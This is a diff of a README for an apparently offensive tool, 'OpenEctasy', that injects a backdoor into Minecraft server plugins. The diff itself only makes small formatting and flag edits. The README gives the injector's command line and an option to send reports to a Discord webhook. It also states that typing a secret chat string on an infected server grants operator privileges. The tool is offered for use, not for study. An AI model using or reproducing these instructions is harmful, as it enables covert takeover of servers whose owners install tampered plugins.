@@ -13,8 +13,8 @@ Inspired by <a href="https://github.com/VoxelHax/OpenBukloit">OpenBukloit</a>
 Download `injector.jar` from the [latest release](https://github.com/Body-Alhoha/OpenEctasy/releases/latest) and put it in the same folder as the plugin you want to inject, then open a command prompt and type the command `java -jar injector.jar --input <file>`
 
 ## Discord Webhook
-You can use the argument `--webhook <link>` to add your discord webhook.
-Example : `java -jar injector.jar --input HD.jar --webhook (link)`
+You can use the argument `--webhook <link>` to add your discord webhook.<br>
+Example : `java -jar injector.jar --i HD.jar --webhook (link)`
 
 ## Usage
 Once the plugin is enabled on a server, type `~ectasy~` in the chat, to automatically gain op privileges.
